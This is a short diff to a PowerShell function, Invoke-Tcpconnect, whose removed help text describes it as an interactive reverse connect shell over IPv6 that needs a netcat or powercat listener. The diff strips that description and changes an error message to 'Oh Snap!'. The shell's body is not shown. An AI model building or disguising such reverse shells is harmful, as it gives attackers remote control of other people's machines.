@@ -1,13 +1,5 @@
-function Invoke-Tcpconnect
-<#
-.SYNOPSIS
-
-
-Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
-listening on the given IP and port. 
-
-
-#>      
+function Invoke-Tcpconnect 
+{ 
     [CmdletBinding(DefaultParameterSetName="reverse")] Param(
 
         [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
@@ -90,7 +82,7 @@ listening on the given IP and port.
     }
     catch
     {
-        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
+        Write-Warning "Oh Snap!" 
         Write-Error $_
     }
 }
